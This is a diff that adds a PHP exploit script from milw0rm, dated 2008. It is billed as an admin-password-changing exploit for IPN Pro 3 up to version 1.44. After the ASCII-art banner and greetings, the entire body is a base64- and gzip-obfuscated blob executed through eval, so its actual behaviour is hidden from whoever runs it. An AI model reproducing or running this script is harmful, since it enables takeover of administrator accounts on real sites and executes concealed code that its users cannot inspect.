@@ -1,0 +1,105 @@
+<?php
+/*
+==============================================================================
+                      _      _       _          _      _   _ 
+                     / \    | |     | |        / \    | | | |
+                    / _ \   | |     | |       / _ \   | |_| |
+                   / ___ \  | |___  | |___   / ___ \  |  _  |
+   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
+                                                             
+
+==============================================================================
+                      ____   _  _     _   _    ___    _  __
+                     / ___| | || |   | \ | |  / _ \  | |/ /
+                    | |  _  | || |_  |  \| | | | | | | ' / 
+                    | |_| | |__   _| | |\  | | |_| | | . \ 
+                     \____|    |_|   |_| \_|  \___/  |_|\_\
+
+==============================================================================
+	IPNPro3 <= 1.44 Admin Password Changing Exploit
+==============================================================================
+
+	[»] Script:             [ IPN Pro 3 ]
+	[»] Language:           [ PHP ]
+	[»] homepage:           [ http://www.dinkumsoft.net/ ]
+	[»] Type:               [ Commercial ]
+	[»] found-report:       [ 26.11.2008-02.12.2008 ]
+	[»] Founder.coder:      [ G4N0K <mail.ganok[at]gmail.com> ]
+
+===[ LIVE ]===
+
+	[»] removed...
+
+
+	
+===[ Greetz ]===
+
+	[»] ALLAH
+	[»] Tornado2800 <Tornado2800[at]gmail.com>
+	[»] B13
+	[»] AFSHIN-ZARBAT <afshin.zarbat[at]yahoo.com>
+	[»] QU1E <evilinhell87[at]yahoo.com>
+	[»] Hussain-X <darkangel_g85[at]yahoo.com>
+
+	//Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-)
+	//ALLAH,forgimme...
+*/
+
+error_reporting(E_ALL);
+	$G4N0K = "vVlJl6LIFv5BuWHQTFn0QlAgSERF5p2AMquvHBB//fsiHNLM7KruU6dOL+IAYcSNO9/vhpFvbeNu".
+                 "OJiNzsQb85PRfDsgrj2b83bkjt1sqduHWJHnnmtMFu4kIwV3MvnkMu8GJ1u1x0TN2T4yGh8niuwm".
+                 "jXpMhJpb+tIx9NuTyXlTUgwL0OGS0fZkiqmYdn1x0vVPSZOcPJWcVlrOxX57NjnbtRWpx84cjQ+p".
+                 "buTxxtqlWn2KG3VvNjYXKeSF8njjqxf752Ny4X5Kf+JU/eniRvO+V/PyaNSzlPJ8iAI7Jzg/1Yd4".
+                 "V/llEEqksk7xxq7jzfzg6XUbLUgWCtIx1bxjOuIKPHupIm1Tjd9PO7lcamqXCB438zzXLrge5D3N".
+                 "Mu59ptvg/VzPqnruFPI8aQbZhOp6MTyb5ZwjY7WK/fpIVDlPREuMRaMiY2sb+v3NEoOMvV6inU/L".
+                 "YJ6tFVm3xr12cWlP0AcXay6TJRHtPt6zlPLpPHgrE3FSUB7CRqpWwd5SsrqJhT5n+lGOM/crZ+eG".
+                 "fn6K/fGeKMYk9a1dpI0zW4TOG7smRZuR6syHQl2FC9kBTxeieselb50izS1MRfajwKgwn+NdTpo6".
+                 "j5U2W2jePm082N+i8xe6zwysGr8305Z7V3wjD4XDJmkkPm7mB+h1H4vklXDWaE7H5YnXwNqtGvd1".
+                 "qssc3buec++Q2VKaaBf554rqfHWlCVvbdVLuLrFw3kXK8JzoWUY46qHe2HZAc8N92kdgl0jwjpEi".
+                 "v4GmETWwr8KLkV9vlvr8FXrbRyPKy/XcqKnrWLMvEWyR+u2eaJ9o7T7zsW3hF4cwMGDH3utktM8S".
+                 "Ta0irT5GF/bbfhlYVD5u5Z/radOHf7vgYydhNEvf20e6VacKXcf0UcbwWchXxKK9verxvEvE+eFm".
+                 "/9cY/EcOW9uGvl1R/5mW4xZ6uNHdfpG/Pib6XX/RPhZUbtpAJ5v53/IR+kYd64y+uPRtbjnanq2R".
+                 "3K5GN3tpUp6OdvvIj5itlMCuVzrsCz4jofcK+1O9Ml0/dNHx3dJPt+loe3ni8xjpYbYSPvnJayrk".
+                 "iCX3LfbVLhLq47RR+VQbvMFOXaR53bSYCFYZ0pFNArlHdMSwVldTMd1FOnRWJu1El3tTEX5Qtqeb".
+                 "3lgMmUJeh/6cvbN4cVhuqJALEPdnxOZEIo0tkPJj/rZfIpvPcobwqZTy05GXmS53EaPFSTPnPxjw".
+                 "U6IMs58OdXB7l9ff564j6J7nn9Z9GdBV9ouzTkRt2Tvy1uB25oDo7dOaQRY8zX+s+zYspfi5TGYH".
+                 "HtlZT/QZvWdebmfReVX6wsfTGP5Kf6DBS9ezrnTWVFeUbzZ/4yXgr2etb7pc/1J/soG64C5QZ51K".
+                 "teyFPLNRO4KO6T4J+Ns5oH8/BwN6ktYmtZN6Xgd0XrzJ9Rv6+6Nj+A/+9wcH9PffxJTD/YP+5PXd".
+                 "/tTe9/hhz1ts3X9n36q0/l39Xf3r6r/ru4/jGTx8H77XycktFk70+7fi90b77t/M926+HNxj9elp".
+                 "dIixn/P9S/2t7/7L/Puac650z8kjN9xiFucf73nl3+jPDvIWdWmH+qWsFuBdvccPlfG8Xj+eiDXw".
+                 "wOKJH5wI4+nM4u8389+fHP9p/Vh48hR4tENPcCGjVqK4Hqgsm/v2AVgmczX1kogpcA7mhBxYMd3F".
+                 "TfKha9jgP4pLidVukdVY1HBgbVqfq9x13JbijMqupIXjcNls1A5sIA66HrhDIJq6B+44zhZGGfl9".
+                 "LgoIw8ozLYJc3FNtv2MHl2fYoUMf4Fust8HeN0OVHNszfIzY4GXi0m/3rBk8L5FCpr3FNhbmoCMD".
+                 "b8zZGdAft1TkejXaZqZolcBFbaoMgKGqwRPGpFjEmN0x6qg3CMteEzfGJRkdVAJsmwCTEW2QLRcy".
+                 "ZzT9IhGHbzNFKmbANsCKG8hVzcpzkdx6EcU58zHoxFr1Arp52HgUw56SEj1DYOwCLp0ugFkWmnQB".
+                 "HoM+r2tue3fxRuYRRxf0GXvaZ3zgrivWToDjl/48IxSBXQ4fGPHCMGIBvFlBZzzkXdtc34R+0B/y".
+                 "9Zc5bhXIdA42yTl8C8BVPD0P2IvytLvxs186VBa1iPw2A3bvsKdF/8Td5bjrxNWk7g/Kw939AL9d".
+                 "7bqxv8rzzMeXvgzf6GNTH75VZu2/kSmED32XSaW8/CmZxC8y5amWf5PpiY+fy1QMbv5X3f13Bx+8".
+                 "9g6K3KDPA47ui4meVl9lchpPNL2PPnjK6DBd3Ghd+xXgetYzgaeCrkPsvpKR2q4g9633Y13AM+6n".
+                 "vQVk2UXo3eNN2qbCN5sdU1EWI1XSnQq+qtv95APb4xs9s+5hHWHyof97Qawxe4UbkpmXHotfU/jo".
+                 "rx6x9zkG7zZivESC9JWPTcx/5cHiw4bffdJzpZbsTqQYF39HN2k85JBvMnYR+vD0m4xGzfrBp1hz".
+                 "2X7kqyfeIS/sZxyo/DSHXvOl0QFjvNyf117qnocjzS7RG6LvJ0qOXpX2kVkV8PLM5e3YENLT1QfS".
+                 "9H0xbAzY5+sasvG6pXflN1hUmVGEGfG9QwLe3xV77Y4lx1P3T/nL+AWtJ7+uuR1RQvCl1nGAnLP4".
+                 "+br3hfxm6IgpZSgRxcgjjd/FtQQ989f3IjpGQYr4sC7BZYwY6H3Q+uTrRmoWBDncExNaQ/kB4psc".
+                 "UUPmDm+5fvfZB4NFrzA2k/PM89oI8R4tyJuhWVvk9XKpST/IiNWpDrn+CF20qC+7aWf/LxYONf2N".
+                 "1JQHxPozP59lO5Lmev9kUl3pNup4ejE38jYZSfsY9kmDebZQbddVBmezVJOkPh9v9eEL3Wc79YpA".
+                 "N5K4pj5EDnM/pfdor2TMn1ZNvY+18cla9Fr4RLBEjYrF9DLtZA/j8U3GfZeM3OPE2WeR3zt43uSN".
+                 "6IYwLcfHKfzAFrxyKQxOk3LYTkdDflJWrVXI2jIwauTNnnmZHCfquQu0vhn5Xmu6qPdBVCMPXiYj".
+                 "mckxF6QjbHGNo3KbLQWvThQ+j+Hbkcf2jugdFMUHpsdi5RW4oU2Q00JBZRjAFLNDKqai6TPccIAf".
+                 "7ql9YsGuI/ULDfdcQ7803zLdhUKObwv4YH8kNVvL+CLlvlo20o9oMQTGGFYJ8p1ZGI/faGwz+xbU".
+                 "H1Qu1dRy2cE3tQj5z/oRi3IdFz+LofbZFz5qV83tDdSJpOmfTGWInGp01Lfwzk+U6m3ph1uysHP4".
+                 "SB4K+92K6l8bbMlTjptt0m0IfwlhA6LXOdHsE72DMovekSyGtzzZd1Kf55bs7ge+Dr0QPe2go8c6".
+                 "UyAvX/MKcg+9c3khRfUG+Tno+TgV+Ro6PL0r5Irp7nXBawt2lzfaHWm+ClFL6f0h8l2OuDmEzuFx".
+                 "P2b67L7r1XIoRjkkpOzH7zzwokZePvzDqyhvlBfkecaf3x1SMoLMtQUb2gz/gq9z6nvIE72jyfTC".
+                 "+C5mBdlNhUgExkEMZxXqKAcM+cNUrrH67qAOa6jXiyyPGu8UFR9r3hc1cg/yc9eToiZFjE62Hzav".
+                 "3tZ+VAJzX57pgt4uKoZbaj96x5iAHvUZ2BJ11kNt9C6JEPGxdu5Dn3dbIl/sfwQOZCpkdaXLiH/w".
+                 "S7HCF5s8ZC/P7I6WaPSeDVgFesc5VaCQl+SpRwivPUIdMb20p5BhnuiEnPCdZtWv005muTQVgF1Q".
+                 "z5Ju+EqUX+fJq54fPkZtSPEysPq1ZwE/R+CI18e6BXJc4zWU58f/Bt2nMz4wKfLk0/wTDqL5/FYP".
+                 "Cgm+08v+DK0B9DP+HgP/9qlb8O/eo4cJFIPZid4xJw3ymzLsJfo8gw8h9/D5VLjab1rQ+/fJG7Xf".
+                 "57759r9Dd7VfIsp5XD5wz+N5q/vFVOSQs8/wSfmNaN98a4b8dCEKvUOzOvTke/S3g9TpI1bnmbfx".
+                 "9oi5DngR+BU4y+llZoGeX+llxLn6zs/P5RtgtMtSyVAHZeRDb58IbrbqZJYniGJrDm9Y7P43++uv".
+                 "/wM=";
+                 eval(base64_decode(gzinflate(base64_decode($G4N0K))));
+?>
+
+# milw0rm.com [2008-12-07]
